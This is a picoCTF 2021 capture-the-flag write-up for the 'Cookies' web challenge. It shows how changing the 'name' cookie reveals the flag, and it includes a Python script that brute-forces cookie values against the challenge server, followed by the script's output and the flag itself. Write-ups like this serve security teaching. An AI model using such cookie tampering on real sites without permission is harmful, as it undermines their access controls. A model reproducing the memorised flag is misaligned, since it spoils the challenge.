# Cookies [Easy] (by madStacks) - picoCTF 2021
> Who doesn't love cookies? Try to figure out the best one. <a href="http://mercury.picoctf.net:29649/">http://mercury.picoctf.net:29649/</a>


Inspect the page and shift to cookie page, we can see `name: -1`, change `-1` to difference numbers and refresh the page. \
We found that only non-negative number works. After trials, the flag is displayed when number is `18`. \
Alternatively, python can do that for us:
```python
import requests, re

for i in range(0,1000):
    a = requests.get("http://mercury.picoctf.net:29649/check",cookies={"name":str(i)}).text
    if "pico" in a:
        print(re.findall("picoCTF{.*}", a)[0])
        exit(0)
    else:
        print("Fail Trial: ",i)
```
```
Fail Trial:  0
Fail Trial:  1
Fail Trial:  2
Fail Trial:  3
Fail Trial:  4
Fail Trial:  5
Fail Trial:  6
Fail Trial:  7
Fail Trial:  8
Fail Trial:  9
Fail Trial:  10
Fail Trial:  11
Fail Trial:  12
Fail Trial:  13
Fail Trial:  14
Fail Trial:  15
Fail Trial:  16
Fail Trial:  17
picoCTF{3v3ry1_l0v3s_c00k135_a1f5bdb7}
```

flag: `picoCTF{3v3ry1_l0v3s_c00k135_a1f5bdb7}`